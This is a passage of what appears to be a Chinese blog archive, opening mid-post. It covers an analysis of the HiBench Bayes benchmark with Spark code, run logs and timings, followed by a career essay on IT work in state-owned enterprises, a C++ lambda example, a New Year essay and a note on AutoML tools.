        job.setOutputFormat(SequenceFileOutputFormat.class);
        job.setMapOutputKeyClass(Text.class);
        job.setMapOutputValueClass(Text.class);
        job.setOutputKeyClass(Text.class);
        job.setOutputValueClass(Text.class);

        log.info("Running Job: " +jobname);
        log.info("Pages file " + dummy.getPath() + " as input");
        log.info("Rankings file " + fout + " as output");
        JobClient.runJob(job);
        log.info("Finished Running Job: " + jobname);
    }

    private void init() throws IOException {

        Utils.checkHdfsPath(options.getResultPath(), true);
        Utils.checkHdfsPath(options.getWorkPath(), true);

        dummy = new Dummy(options.getWorkPath(), options.getNumMaps());

        int words = RawData.putDictToHdfs(new Path(options.getWorkPath(), HtmlCore.getDictName()), options.getNumWords());
        options.setNumWords(words);

        Utils.serialWordZipf(options);
    }

    public void generate() throws Exception {

        init();

        createBayesData();

        close();
    }

    private void close() throws IOException {
        log.info("Closing bayes data generator...");
        Utils.checkHdfsPath(options.getWorkPath());
    }
}

prepare.sh运行时输出如下，可以看到刚开始主要是读取配置文件中的内容，随后调用hadoop和jar包跑了一个任务，这个就是bayes文本分类的生成数据，按照第一节以及介绍的和官网的说明，这个文本主要使用linux中的字典：”/usr/share/dict/words”并且符合zipfian分布。
[hdfs@sf11 prepare]$ ./prepare.sh  
patching args= 
Parsing conf: /opt/HiBench/HiBench-master/conf/00-default-properties.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/01-default-streamingbench.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/10-data-scale-profile.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/20-samza-common.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/30-samza-workloads.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/99-user_defined_properties.conf 
Parsing conf: /opt/HiBench/HiBench-master/workloads/bayes/conf/00-bayes-default.conf 
Parsing conf: /opt/HiBench/HiBench-master/workloads/bayes/conf/10-bayes-userdefine.conf 
probe sleep jar: /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/share/hadoop/mapreduce2/hadoop-mapreduce-client-jobclient-tests.jar 
start HadoopPrepareBayes bench 
/opt/HiBench/HiBench-master/bin/functions/workload-functions.sh: line 120: /dev/stderr: Permission denied 
rm: `hdfs://archive.cloudera.com:8020/HiBench/Bayes/Input’: No such file or directory 
Submit MapReduce Job: /opt/cloudera/parcels/CDH/lib/hadoop/bin/hadoop –config /etc/hadoop/conf jar /opt/HiBench/HiBench-master/src/autogen/target/autogen-5.0-SNAPSHOT-jar-with-dependencies.jar HiBench.DataGen -t bayes -b hdfs://archive.cloudera.com:8020/HiBench/Bayes -n Input -m 300 -r 1600 -p 500000 -class 100 -o sequence 
16/10/21 16:34:02 WARN mapreduce.JobResourceUploader: Hadoop command-line option parsing not performed. Implement the Tool interface and execute your application with ToolRunner to remedy this. 
16/10/21 16:34:32 INFO HiBench.BayesData: Closing bayes data generator… 
finish HadoopPrepareBayes bench
部分生成数据：

在看了将近两周的HiBench代码进行测试后，终于摸清上述的运行流程，intel 的这个测试框架确实比较简介，通过配置文件和shell以及一些大数据框架自带的例子（如Hibench中的workcount测试就是直接调用hadoop或者spark自带的程序）完成了整个庞大的测试工作，下面我们针对贝叶斯文本分类算法中HiBench使用的三种语言：python，scala，java分别进行分析：
2.3 python代码分析
 

部分python代码：
#
# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements.  See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the "License"); you may not use this file except in compliance with
# the License.  You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

"""
A naive bayes program using MLlib.

This example requires NumPy (http://www.numpy.org/).
"""

import sys

from pyspark import SparkContext
from pyspark.mllib.util import MLUtils
from pyspark.mllib.classification import NaiveBayes
from pyspark.mllib.regression import LabeledPoint
from pyspark.mllib.linalg import Vectors
from pyspark.storagelevel import StorageLevel
from operator import add
from itertools import groupby
#
# Adopted from spark's doc: http://spark.apache.org/docs/latest/mllib-naive-bayes.html
#
def parseVector(line):
    return np.array([float(x) for x in line.split(' ')])

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print >> sys.stderr, "Usage: bayes <file>"
        exit(-1)
    sc = SparkContext(appName="PythonNaiveBayes")
    filename = sys.argv[1]


    data = sc.sequenceFile(filename, "org.apache.hadoop.io.Text", "org.apache.hadoop.io.Text")
    wordCount = data                                \
        .flatMap(lambda (key, doc):doc.split(" "))    \
        .map(lambda x:(x, 1))                                \
        .reduceByKey(add)

    wordSum = wordCount.map(lambda x:x[1]).reduce(lambda x,y:x+y)
    wordDict = wordCount.zipWithIndex()             \
        .map(lambda ((key, count), index): (key, (index, count*1.0 / wordSum)) )             \
        .collectAsMap()
    sharedWordDict = sc.broadcast(wordDict)

    # for each document, generate vector based on word freq
    def doc2vector(dockey, doc):
        # map to word index: freq
        # combine freq with same word
        docVector = [(key, sum((z[1] for z in values))) for key, values in
                     groupby(sorted([sharedWordDict.value[x] for x in doc.split(" ")],
                                    key=lambda x:x[0]),
                             key=lambda x:x[0])]

        (indices, values) = zip(*docVector)      # unzip
        label = float(dockey[6:])
        return label, indices, values

    vector = data.map( lambda (dockey, doc) : doc2vector(dockey, doc))

    vector.persist(StorageLevel.MEMORY_ONLY)
    d = vector.map( lambda (label, indices, values) : indices[-1] if indices else 0)\
              .reduce(lambda a,b:max(a,b)) + 1


#    print "###### Load svm file", filename
    #examples = MLUtils.loadLibSVMFile(sc, filename, numFeatures = numFeatures)
    examples = vector.map( lambda (label, indices, values) : LabeledPoint(label, Vectors.sparse(d, indices, values)))

    examples.cache()

    # FIXME: need randomSplit!
    training = examples.sample(False, 0.8, 2)
    test = examples.sample(False, 0.2, 2)

    numTraining = training.count()
    numTest = test.count()
    print " numTraining = %d, numTest = %d." % (numTraining, numTest)
    model = NaiveBayes.train(training, 1.0)

    model_share = sc.broadcast(model)
    predictionAndLabel = test.map( lambda x: (x.label, model_share.value.predict(x.features)))
#    prediction = model.predict(test.map( lambda x: x.features ))
#    predictionAndLabel = prediction.zip(test.map( lambda x:x.label ))
    accuracy = predictionAndLabel.filter(lambda x: x[0] == x[1]).count() * 1.0 / numTest

    print "Test accuracy = %s." % accuracy


2.4 scala 代码分析
run-spark-job org.apache.spark.examples.mllib.SparseNaiveBayes ${INPUT_HDFS}
显然scala 的朴素贝叶斯就是调用spark mllib库中的代码了
 
 

2.5 java 代码分析
run-spark-job com.intel.sparkbench.bayes.JavaBayes ${INPUT_HDFS}
java部分比较意外的HiBench没有采用原生的代码或者jar包，而是自己写了一个 
代码如下，回头慢慢分析：
/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.intel.sparkbench.bayes;

import org.apache.spark.SparkContext;
import org.apache.spark.api.java.function.FlatMapFunction;
import org.apache.spark.api.java.function.Function;
import org.apache.spark.api.java.function.Function2;
import org.apache.spark.api.java.function.PairFunction;
import org.apache.spark.broadcast.Broadcast;
import org.apache.spark.mllib.classification.NaiveBayesModel;
import org.apache.spark.mllib.linalg.Vectors;
import org.apache.spark.rdd.RDD;
import org.apache.spark.storage.StorageLevel;
import scala.*;
import org.apache.spark.SparkConf;
import org.apache.spark.api.java.JavaPairRDD;
import org.apache.spark.api.java.JavaRDD;
import org.apache.spark.api.java.JavaSparkContext;
import org.apache.spark.mllib.regression.LabeledPoint;
import org.apache.spark.mllib.util.MLUtils;
import org.apache.spark.mllib.classification.NaiveBayes;
import org.apache.hadoop.io.Text;

import java.lang.Boolean;
import java.lang.Double;
import java.lang.Long;
import java.util.*;
import java.util.regex.Pattern;


/*
 * Adopted from spark's doc: http://spark.apache.org/docs/latest/mllib-naive-bayes.html
 */
public final class JavaBayes {
  private static final Pattern SPACE = Pattern.compile(" ");

  public static void main(String[] args) throws Exception {

    if (args.length < 1) {
      System.err.println("Usage: JavaBayes <file>");
      System.exit(1);
    }

    Random rand = new Random();

    SparkConf sparkConf = new SparkConf().setAppName("JavaBayes");
    JavaSparkContext ctx = new JavaSparkContext(sparkConf);
//    int numFeatures = Integer.parseInt(args[1]);

    // Generate vectors according to input documents
    JavaPairRDD<String, String> data = ctx.sequenceFile(args[0], Text.class, Text.class)
            .mapToPair(new PairFunction<Tuple2<Text, Text>, String, String>() {
                @Override
                public Tuple2<String, String> call(Tuple2<Text, Text> e) {
                    return new Tuple2<String, String>(e._1().toString(), e._2().toString());
                }
            });

    JavaPairRDD<String, Long> wordCount = data
            .flatMap(new FlatMapFunction<Tuple2<String, String>, String>() {
                @Override
                public Iterable<String> call(Tuple2<String, String> e) {
                    return Arrays.asList(SPACE.split(e._2()));
                }
            })
            .mapToPair(new PairFunction<String, String, Long>() {
                @Override
                public Tuple2<String, Long> call(String e) {
                    return new Tuple2<String, Long>(e, 1L);
                }
            })
            .reduceByKey(new Function2<Long, Long, Long>() {
                @Override
                public Long call(Long i1, Long i2) {
                    return i1 + i2;
                }
            });

      final Long wordSum = wordCount.map(new Function<Tuple2<String, Long>, Long>(){
          @Override
          public Long call(Tuple2<String, Long> e) {
              return e._2();
          }
      })
      .reduce(new Function2<Long, Long, Long>() {
          @Override
          public Long call(Long v1, Long v2) throws Exception {
              return v1 + v2;
          }
      });

    List<Tuple2<String, Tuple2<Long, Double>>> wordDictList = wordCount.zipWithIndex()
            .map(new Function<Tuple2<Tuple2<String, Long>, Long>, Tuple2<String, Tuple2<Long, Double>>>() {
                @Override
                public Tuple2<String, Tuple2<Long, Double>> call(Tuple2<Tuple2<String, Long>, Long> e) throws Exception {
                    String key = e._1()._1();
                    Long count = e._1()._2();
                    Long index = e._2();
                    return new Tuple2<String, Tuple2<Long, Double>>(key, new Tuple2<Long, Double>(index,
                            count.doubleValue() / wordSum));
                }
            }).collect();

    Map<String, Tuple2<Long, Double>> wordDict = new HashMap();
    for (Tuple2<String, Tuple2<Long, Double>> item : wordDictList) {
        wordDict.put(item._1(), item._2());
    }

    final Broadcast<Map<String, Tuple2<Long, Double>>> sharedWordDict = ctx.broadcast(wordDict);

    // for each document, generate vector based on word freq
      JavaRDD<Tuple3<Double, Long[], Double[]>> vector = data.map(new Function<Tuple2<String, String>, Tuple3<Double, Long[], Double[]>>() {
          @Override
          public Tuple3<Double, Long[], Double[]> call(Tuple2<String, String> v1) throws Exception {
              String dockey = v1._1();
              String doc = v1._2();
              String[] keys = SPACE.split(doc);
              Tuple2<Long, Double>[] datas = new Tuple2[keys.length];
              for (int i = 0; i < keys.length; i++) {
                  datas[i] = sharedWordDict.getValue().get(keys[i]);
              }
              Map<Long, Double> vector = new HashMap<Long, Double>();
              for (int i = 0; i < datas.length; i++) {
                  Long indic = datas[i]._1();
                  Double value = datas[i]._2();
                  if (vector.containsKey(indic)) {
                      vector.put(indic, value + vector.get(indic));
                  } else {
                      vector.put(indic, value);
                  }
              }

              Long[] indices = new Long[vector.size()];
              Double[] values = new Double[vector.size()];

              SortedSet<Long> sortedKeys = new TreeSet<Long>(vector.keySet());
              int c = 0;
              for (Long key : sortedKeys) {
                  indices[c] = key;
                  values[c] = vector.get(key);
                  c+=1;
              }

              Double label = Double.parseDouble(dockey.substring(6));
              return new Tuple3<Double, Long[], Double[]>(label, indices, values);
          }
      });

      vector.persist(StorageLevel.MEMORY_ONLY());
       final Long d = vector
               .map(new Function<Tuple3<Double,Long[],Double[]>, Long>() {
                   @Override
                   public Long call(Tuple3<Double, Long[], Double[]> v1) throws Exception {
                       Long[] indices = v1._2();
                       if (indices.length > 0) {
//                           System.out.println("v_length:"+indices.length+"  v_val:" + indices[indices.length - 1]);
                           return indices[indices.length - 1];
                       } else return Long.valueOf(0);
                   }
               })
              .reduce(new Function2<Long, Long, Long>() {
                  @Override
                  public Long call(Long v1, Long v2) throws Exception {
//                      System.out.println("v1:"+v1+"  v2:"+v2);
                      return v1 > v2 ? v1 : v2;
                  }
              }) + 1;

    RDD<LabeledPoint> examples = vector.map(new Function<Tuple3<Double,Long[],Double[]>, LabeledPoint>() {
        @Override
        public LabeledPoint call(Tuple3<Double, Long[], Double[]> v1) throws Exception {
            int intIndices [] = new int[v1._2().length];
            double intValues [] = new double[v1._3().length];
            for (int i=0; i< v1._2().length; i++){
                intIndices[i] = v1._2()[i].intValue();
                intValues[i] = v1._3()[i];
            }
            return new LabeledPoint(v1._1(), Vectors.sparse(d.intValue(),
                    intIndices, intValues));
        }
    }).rdd();

    //RDD<LabeledPoint> examples = MLUtils.loadLibSVMFile(ctx.sc(), args[0], false, numFeatures);
    RDD<LabeledPoint>[] split = examples.randomSplit(new double[]{0.8, 0.2}, rand.nextLong());

    JavaRDD<LabeledPoint> training = split[0].toJavaRDD();
    JavaRDD<LabeledPoint> test = split[1].toJavaRDD();

    final NaiveBayesModel model = NaiveBayes.train(training.rdd(), 1.0);
    JavaRDD<Double> prediction =
        test.map(new Function<LabeledPoint, Double>() {
            @Override
            public Double call(LabeledPoint p) {
                return model.predict(p.features());
            }
        });

    JavaPairRDD < Double, Double > predictionAndLabel =
        prediction.zip(test.map(new Function<LabeledPoint, Double>() {
            @Override
            public Double call(LabeledPoint p) {
                return p.label();
            }
        }));

    double accuracy = (double) predictionAndLabel.filter(
            new Function<Tuple2<Double, Double>, Boolean>() {
                @Override
                public Boolean call(Tuple2<Double, Double> pl) {
                    return pl._1().equals(pl._2());
                }
            }).count() / test.count();

    System.out.println(String.format("Test accuracy = %f", accuracy));
    ctx.stop();
  }
}



3.运行结果



Type
Date
Time
Input_data_size
Duration(s)
Throughput(bytes/s)
Throughput/node



JavaSparkBayes
2016-10-09
16:41:09
113387030
48.857
2320793
2320793


ScalaSparkBayes
2016-10-09
16:42:00
113387030
45.164
2510562
2510562


PythonSparkBayes
2016-10-09
16:44:03
113387030
118.521
956683
956683


bayes算法数据规模参考：
#Bayes 
hibench.bayes.tiny.pages                        25000 
hibench.bayes.tiny.classes                      10 
hibench.bayes.tiny.ngrams                       1 
hibench.bayes.small.pages                       30000 
hibench.bayes.small.classes                     100 
hibench.bayes.small.ngrams                      2 
hibench.bayes.large.pages                       100000 
hibench.bayes.large.classes                     100 
hibench.bayes.large.ngrams                      2 
hibench.bayes.huge.pages                        500000 
hibench.bayes.huge.classes                      100 
hibench.bayes.huge.ngrams                       2 
hibench.bayes.gigantic.pages                    1000000 
hibench.bayes.gigantic.classes                  100 
hibench.bayes.gigantic.ngrams                   2 
hibench.bayes.bigdata.pages                     20000000 
hibench.bayes.bigdata.classes                   20000 
hibench.bayes.bigdata.ngrams                    2

参考文献

https://github.com/intel-hadoop/HiBench
 









不是混不下去了才写生存指南，因为我妈指着新闻联播说，娃呀，你要是不在国企干了，在这上面见你的机会就基本没了，我。。。

特别提醒：含有保密协议的国企，研究所，慎重选择！！！ 
一旦离职很有可能是完全脱产一年时间来进行脱密

1. 真实的找工作故事
2016年我要毕业于是从2015年底我就开始准备找工作了。当时还在IBM实习，实习期间，并没有做出什么出彩的工作。只是按照师傅的要求，对于组内调查问卷的pc端产品。移植到ISO上做了一个简单的demo，使用tinyxml2解析xml生成调查问卷模板并展示，白天做这个，晚上回去改自己写的一个没啥创新点的论文，用图论做立体匹配，分割后构造图的时候多给边上加个权值。平时还要练习leetcode，成天瞎忙，然而结果没有陪我演戏。金九银十没有一家互联网企业给我发offer。
bat加京东笔试全挂，我已经开始怀疑人生。信心的丧失部分影响了我对后续单位情况的判断。
只有绿盟过了一面，完美世界和Intel到了二面就杳无音讯，我当时一直在应聘c++程序员，完美世界二面全问的tcp网络协议，滑动窗口拥塞控制，不会，至今，也不会，毫无悬念的跪了。
Intel二面和一个女面试官聊了一个多小时，异常开心，说了很多很多IBM的实习见闻，感觉高端养老院的企业文化在哪都是喜闻乐见的，结果还是没过，非常费解。
绿盟就有一些意思了，笔试题做的不错，一面聊了两句我说我是CSDN博客专家斑竹，好了回去等消息，二面我说我在IBM实习过，好了回去等消息，结果说要等副总来面谈，这一下又等了好久，三面是副总，直接问想要多钱，我说我不是为了钱，主要是看中企业文化和未来发展，副总上下打量着我说8500咋样，我心想offer终于来了，已经很超出我的预期了。
在等绿盟三面的过程中，一个本地的研究所邀我去面试，暂且称为S所。 
S所面试一共来了两波人，第一波校招五个，第二波社招五个，校招五个一问，交大，西大，长大，好家伙不会是叫我来充数的吧，面试也没问啥，自我介绍一完，问了三个问题，会这个嘛，会那个嘛，我说，会，熟练，精通。
然后就是二面，直接人事处处长开始介绍待遇了，交大的同学问了很多和切身利益相关的具体问题，比如工资具体是多少。然后我惊奇的发现，入职工资是根据学校划分的，比如，西电的5500，西农的6000，师大的5000，后来我很费解，为啥师大这么低，原来我本科不行，西农由于是985所以碾压了大家，有趣的事情就此开始了。

2. 困惑
我曾经在国企非常困惑的一点就是，我每天在单位干了不少活，为啥那么像丙方，而且工资那么低呢？参考文献中说道，你干的活其实没有什么财富价值。
为什么要离开现在的单位，因为根本没有为社会创造财富。所以我现在的工作只有单位支付工资，他并不值钱。
在国企工作的IT从业人员难免会因为周围的环境变的迷失，一个清晰的职业生涯规划是非常重要的，我一度一段时间里一壶茶一支烟一张报纸看半天搓完手机搓电脑，也有通宵蹲在机房忍受机器的轰鸣。反正我是越干越困惑，我到底是为谁在卖命？
最近有幸和IBM的一些高级架构方案师们有了一些交流，有句老话说：单位就像一棵爬满猴子的大树，向上看全是屁股，向下看都是笑脸，左右皆是耳目。每个人都在颠簸的尘世中寻找平衡的支点，我们平时在国企唯领导马首是瞻，这是一种深井病，我们只关注领导的一举一动，对了也不是，错了也不是，因为你只能看到领导的屁股，你又能猜测出些什么有价值的东西呢？所以干活缺乏主观能动性。
假如加入的是创业型公司，这样的态度是不能有的。你需要时刻想着，我能为单位做些什么，我能怎么利用我的才能让单位、团队向着好的方向发展。 
假如你身处任何位置都能有这样的想法，那么成功指日可待。

3. 建议
过来人给出几个小tips，还望大家海涵

多与领导沟通，因为会哭的孩子有奶吃，领导干部那么忙，他根本不知道你干了多少活，怎么给你涨工资？kpi考核，不存在的。。。
勤于表现，是金子总会发光，炼丹炉里面的金子，发什么光！ 
在国企的技术人员不好混，人员关系特别复杂，要想专心把技术搞上来，可能要比在互联网公司付出更大代价。
工作不饱和，强度小是国企IT人员的显著特点，多利用闲暇时间系统的学习一门手艺，更多的领导注意意味着更多的资源与平台，早日出人头地实现梦想在于抓住机会表现自己的闪光点。
懂得拒绝，不是自己的活一般不要干，比如你文章写的好，领导有个新闻稿让你写，你写还是不写？写了以后是不是都归你写了？清晰的职业规划告诉你，咱应该focus on 一些东西，技术人员要成为T字型人才，宽度要足够，但也要有一项立足之本的技术做到足够深入。
不要和周围的人同流合污，别人没时间看书，成天玩，你不能玩，要高标准高要求自己。别人雄安新区2亩地，咱呢？
调整心态，在国有企业的IT从业者，要有一种健康的心理状态，不要总想着自己拿着卖白菜的心，操着卖白粉的心，还拿钱最少，心态不好了干活的效果也不好。人从来都不是累死的，而是懒死的，生于忧患死于安乐，天道酬勤对于年轻人来说一点都不假。

未完待续
今天先说到这里，有兴趣的欢迎留言评论，说出你自己的故事。

参考文献
年薪50万美金的工程师到底牛在哪里? 






// Lambda_test20140801.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <algorithm>
#include <iostream>
#include <vector>
using namespace std;


int main()
{
	//创建一个包含10个元素的集合对象
	vector<int> v;

	for (int i = 0; i < 10; ++i)
	{
		v.push_back(i);
	}

	//使用for_each 语句和lambda表达式来实现对偶元素的计数

	int evenCount = 0;
	for_each(v.begin(),v.end(),[&evenCount](int n){
		
		cout<<n;

		if (n % 2 == 0)
		{
			cout<<" is even"<<endl;

			//increment the counter
			evenCount++;

		}
		else
		{
			cout<<" is odd"<<endl;

		}
	
	
	
	});

	//将偶元素个数打印出来
	cout<<"There are "<<evenCount<<" even numbers in the vector"<<endl;


	getchar();




	return 0;
}

 








完成于2014年年初

文章大纲1.影评2.经典3.成长！
 每当新年，我都在这里为你祝福，也在这里为你剖白。
 剖白是为了沟通，沟通是为了理解，理解是为了共识，共识是为了共行。
 此时此刻，你我虽远隔千山万水，然你却横跨五湖四海，不远万里送上一赞，
  我受此大恩，定然不能让你失望。
                                                                      ----题记



1.影评
去年的致辞还历历在目，马年已经姗姗的到来了。
去电影院的时候，我发现其实片头的预告片广告一般都是最精彩的。今年就早早的坐定，发现春晚换成电影导演了，果然晚会也有了预告片。对春晚二字的解读还甚是有那么点味道。冯小刚的整个电影生涯，他一直在为人民群众造梦，从《甲方乙方》《不见不散》这种宣扬人情冷暖的影片到《集结哨》《1942》等表现战争灾难的佳作，他一直在拍摄自己迷恋的生活。冯导在《我把青春先给你》中说道：“王朔那种与时俱进的视野和观察生活的角度，对我日后的导演生涯产生了深远的影响，成为了指导我拍摄贺岁片的纲领性文献。”今年的春晚自然又是冯导的又一部贺岁大片，只是这部影片得迎合太多人的口味。
电影跟晚会不同，电影终将不过是一场虚幻，眼泪，惆怅，失落，恐惧，惊喜，慌乱，爱不得，生离别，相见欢。。。。。。一旦灯光亮起，电影是电影，生活就还是生活了，如果你的人生是一部电影，那你希望她叫什么？
如果非要给人生这部电影写一篇影评，我真诚的希望她的IMDB 评分千万不要低于8分。并且电影的女主角能早点读到文章此处。截至发稿时，上一个愿望还未实现。

2.经典
前几日考研总分的时候，我记着学校影视编导的一道论述题目说，论述何为经典？（25分）
有的考生说文解字娓娓道来，说，经典是指具有典范性、权威性的著作。洋洋洒洒引经据典写了几千字，忘了自己要考导演专业，倒像是文学院的哥们走错了考场，老师画了个大大的零蛋，苍凉的摆在字里行间。有的考生写自己小时候最看的红色经典，对《地雷战》《地道战》《南征北战》解读的头头是道，笔下生花，条理清晰，读来如饮美酒，如坐春风。有的考生说，经典是符合意识形态与时代需求的，这个时代的经典并不一定是那个时代的经典，倒也算是推陈出新，最后自圆其说，自是别出心裁。
我依稀记得希区柯克说过，戏剧就是将生活的枯燥遗忘。所以即便是最冷酷无情的工作也能被渲染成激情四射。一个英国的普通公务员，却成就了50年的经典形象，这就是007.这就是经典。
小马哥干掉坏人以后，总是拖着一条血腿，还要叼着根牙签。完后信誓旦旦的向所有人宣告，我不是要证明我比别人强，而是要让他们知道，我不见了的东西一定要亲手拿回来。星爷的dry马蒂尼，还有神乎其神的ak-47扫射都让这个男人在每部电影中都那样的鲜明，那样的出色。还有一连串的影星，导演。他们是香港电影的经典，伴随我们这一代人成长的经典。是那个时代的经典。
灌篮高手，激励了一代人的篮球梦想。那一句：同学，你喜欢打篮球吗？如何真的有女生手捧篮球同样的问出来，估计谁都会束手就擒啦。
我想，经典就是能够激起我们心中共鸣最多的东西吧！

3.成长！
德国哲学家费尔巴哈曾说：我们的时代重影像而轻实在，重副本而轻原件，重表现而轻现实，重外表而轻本质。这个时代是手机的时代，时间是碎片化的时间，社交网路更让人沉醉其中不能自拔，你的每个喜怒哀乐都会以每24h一次的频率迅速被人遗忘，于是我想，到底什么才是恒久不变的珍藏？
思考这个问题的过程伴随了我一小段时间的成长。于是，我开始了品读经典的旅程，我想这些经过时间洗礼的东西多少能给出点线索。
以往的那些建立在精神上的彼此认同在经典中跃然纸上：比如，朋友应该是讲义气的，对爱情应该是忠贞不二的，对理想应该是奋不顾身的，对生活应该是充满热情的，对困难应该是充满智慧的，对灰暗应该是充满调侃的。。。
我从《卡萨布兰卡Casablanca》中得到革命时期的爱情真谛，我从《无间道》中明白为什么人在江湖身不由己，出来混总是要还的。《射雕英雄传》告诉我出来混一定要讲义气，并且做人一定要老实。不然即使碰上黄蓉，也不会喜欢你。《神雕侠侣》说，问世间，情为何物，直教人，生死相许。所以，用情要专一。
我听张学友，张国荣的歌，看刘德华，梁朝伟的电影，学学他们这些老男人的风度，梦想成长的跟他们一样。我忽然想起电影《红猪》来了，《红猪》中的波鲁克为男人们提供了一种古典而优雅的范本，其根本是轻视肉体的漂亮，摒弃虚浮的装饰。他提醒男人，尤其是疲倦操劳的中年男人，自身与美，自身与浪漫的不可分离。责任感，骑士精神，豪迈的气势，成熟的事业。这种美属于大地，朴实且厚重。时代会变，江山会易主，但是真正的战友忠于信念，至死不渝。
何时才能成长为那样一位大叔，肌肉与智慧并存，英雄与侠义的化身？
吃年夜饭的时候，新闻又报道了一例农民工讨薪的成功案例。
现在农民工辛苦了一年，难道发了工资还要感谢一下国家政策以及监管部门的大力支持，这难道不是他们TMD应该做的么？新闻联播弘扬的就是这样的中国梦？无外乎，国外媒体评论说，几千万青年人都争着去考公务员，这是对人才的浪费啊。但是我以为，至少在年跟前，不会给公务员同志拖欠半天的工资。世间的事大抵如此，我也没有什么好说的，原来，因为成熟而麻木的外表下，早已习惯了随波逐流的躯壳里，我经历了太多波澜不惊的日子而变的容易满足的内心，正在义无反顾的朝着曾经自己最厌恶的样子缓缓前去。
这样，算不算，也是一种成长？不过，显然算是长歪了。。。
然而，我终将希望青春不要像，4块钱一本的《青年文摘》青春风铃情感专栏里的小青年一样那么绚丽多彩，一会白血病，一会三角恋。成长的这些时光告诉我们，我是什么，我变拥有什么样的时代。
我还有些许阳光，我还能再烧包一会。
THE END!
ALL RIGHTS RESERVED!

p.s.
据不完全统计：
本年度共收到66条拜年短信，8份微信祝福，其中7名女生1名男生，8份QQ祝福，其中7名女生1名男生。66条拜年短信中有12条短信，由匿名者发出，为了不伤害她们的感情，我没有敢询问尊姓大名。
今天中午12时开始，我总共拨打了18个拜年电话，飞信发送79条短信，手机发送41条短信。短信内容，采用百度搜索到的小学生作文（过年啦）片段，有95.41%的童鞋们收到后，回复夸赞我的语文水平，余下的同学感叹写的字数太多，感慨自己居然看完了。
Play it Sam ,Play as time goes by.

我的博客即将同步至腾讯云+社区，邀请大家一同入驻：
https://cloud.tencent.com/developer/support-plan?invite_code=377j9p19ivc40










作者：一人

Featuretools如你所言能够自动完成特征工程，它属于AutoML范畴，接下来我还是主要谈AutoML1吧。由于机器学习应用高门槛和应用范围的广阔，所以很多组织于2017和2018年开始自动化的机器学习尝试，想降低机器学习应用的门槛，让非专业人员也能够应用。机器学习的工作流通常为数据清洗、特征工程、模型选择、模型训练、模型评估，针对机器学习的自动化尝试，也在这几个步骤展开。
由于数据清洗和数据强关联，在这一部分只能根据具体应用和情景进行处理，无法抽象出来使用通用方法解决；针对特征工程部分，据我查阅所看，自动化工具很少，Featuretools算是一个吧；但是针对后面模型选择与模型训练、模型评估的自动化工具就比较多了，例如Google的automl,Microsoft的NNI2以及autosklearn3等。
当前自动化的工具主要根据机器学习算法分为两个类别4：
自动传统机器学习方法与自动神经网络方法。自动传统机器学习方法最为典型的应用就是auto-sklearn，面向的算法主要是LR，SVM，GBDT等。而针对自动化神经网络的工具当前处于研究的前沿，具有代表性的工具除过上面google和Microsoft之外还有auto-Keras,百度的AutoDL等，由于神经网络能够自动化完成特征工程，因此所有的工具都主要集中在网络架构和参数搜索上了。
automl从2017年开始引起关注，2018号称automl的元年，由此也能看出来其离实际应用还有比较长的距离。虽然如此说，但是针对传统机器学习的自动化工具现在还是值得尝试。
传统机器学习方法已经发展很多年了，针对这部分自动化工具也诞生有些年头了，auto-sklearn已4年。但是很不幸，据使用过的人说，效果还是比较有限，不如人工做出来的效果好，如果对于效果要求不很高，不妨试试，毕竟构建快成本低。自动神经网络就不用在说了。从目前发展状况来看，短期内这个领域应该不会有什么大的突破，但是长期看自动化机器学习还是很有前途的。
如果要想进一步了解AutoML的内容，可以查看zhihu中automl话题下的讨论，https://www.zhihu.com/topic/20173754/hot

机器学习技术落地难，急需懂算法的产品人员。
算法工程师从业人员已经饱和。学习资料易得，学习门槛降低。还记得在2016年底时我们俩谈过：由于现在的各种教程漫天飞，这个领域必将涌入大量的从业人员。
从近两年发展来看现状确实如此，去年校招的很多报道说：算法岗收到的简历与职位的比例远远大于100:1，各大公司现如今对于算法工程师的门槛要求也是水涨船高，高的我看见都发怵。机器学习在产品上的应用远没有想象的那样迅速铺展开来，新进入人员没有新坑能占。当前机器学习应用比较广的领域：

图像的监控与文字识别，
NLP的智能助手与智能客服；
推荐、搜索、广告系统等。

这些都是发展很多年的领域并不新，所以也就没有新的岗位创造出来，进一步加深了行业人员的饱和。因此，当前行业并不缺懂算法的工程师，或者说并不缺初中级算法工程师。
急需能够让算法落地的产品人员。不用质疑机器学习的应用范围是很广的，但是应用的落地速度并不如预期，这在一定程度上反应出来：算法人员不懂产品，产品人员不懂算法。这种隔阂才是算法不能迅速落地的关键因素。
所以，如果在这个方向的从业人员应该多多将精力放在如何填补这鸿沟上，要么产品人员多学学算法，要么算法人员多多了解产品知识。
个人观点：能够掌握主流的算法原理，有两三个算法实际项目，能够掌握产品方面的技能，这种人才才是当前的香饽饽。



机器之心，AutoML、AutoKeras…这四个「Auto」的自动机器学习方法你分得清吗？https://zhuanlan.zhihu.com/p/49494212 ↩︎

Microsoft, NNI,  https://github.com/Microsoft/nni ↩︎

Machine Learning Professorship Freiburg, Auto-sklearn, https://automl.github.io/auto-sklearn/stable/# ↩︎

第四范式，AutoML在推荐系统中的应用，https://zhuanlan.zhihu.com/p/52907645 ↩︎













